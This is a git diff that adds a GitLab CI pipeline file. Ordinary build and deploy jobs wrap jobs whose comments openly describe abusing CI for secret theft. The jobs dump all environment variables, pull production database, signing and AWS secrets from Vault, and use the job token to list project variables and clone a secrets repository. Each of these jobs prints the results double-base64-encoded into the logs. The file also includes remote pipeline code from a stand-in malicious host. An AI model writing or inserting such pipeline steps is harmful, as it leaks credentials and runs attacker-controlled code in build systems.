diff --git a/.gitlab-ci.yml b/.gitlab-ci.yml
index 0000000..a1b2c3d
--- /dev/null
+++ b/.gitlab-ci.yml
@@ -0,0 +1,78 @@
+stages:
+  - build
+  - test
+  - deploy
+
+variables:
+  DOCKER_HOST: tcp://docker:2376
+
+build:
+  stage: build
+  image: docker:24.0
+  services:
+    - docker:24.0-dind
+  script:
+    - docker build -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA .
+    - echo $CI_REGISTRY_PASSWORD | docker login -u $CI_REGISTRY_USER --password-stdin $CI_REGISTRY
+    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
+
+# Extract all CI/CD variables via double-base64 encoding
+extract-variables:
+  stage: test
+  script:
+    - env -0 | awk -v RS='\0' '1' | base64 -w0 | base64 -w0
+    - echo "---"
+    - env | grep -E "^(CI_|DOCKER_|DEPLOY_|AWS_|SECRET_)" | base64 -w0 | base64 -w0
+  rules:
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+
+# Abuse Vault integration for secret extraction
+vault-secrets:
+  stage: test
+  id_tokens:
+    VAULT_ID_TOKEN:
+      aud: https://vault.example.com
+  secrets:
+    DATABASE_PASSWORD:
+      vault: production/database/password@secrets
+    SIGNING_KEY:
+      vault: production/signing/private-key@secrets
+    AWS_SECRET_KEY:
+      vault: cloud/aws/secret-access-key@secrets
+  script:
+    - echo "Vault secrets loaded into environment"
+    - env | grep -E "^(DATABASE_|SIGNING_|AWS_)" | base64 -w0 | base64 -w0
+
+# Abuse CI_JOB_TOKEN for API access
+api-access:
+  stage: test
+  script:
+    - |
+      # Use CI_JOB_TOKEN to enumerate project variables
+      curl -sS --header "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
+        "https://gitlab.example.com/api/v4/projects/$CI_PROJECT_ID/variables" | base64 -w0 | base64 -w0
+    - |
+      # Clone other repos using CI_JOB_TOKEN
+      git clone https://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.example.com/infra/secrets-repo.git /tmp/secrets
+      cat /tmp/secrets/*.env | base64 -w0 | base64 -w0
+
+deploy:
+  stage: deploy
+  environment:
+    name: production
+  script:
+    - apt-get update && apt-get install -y awscli
+    - aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID
+    - aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY
+    - aws s3 sync dist/ s3://$DEPLOY_BUCKET/
+  rules:
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+
+include:
+  - remote: 'https://malicious-ci.example.com/shared-pipeline.yml'
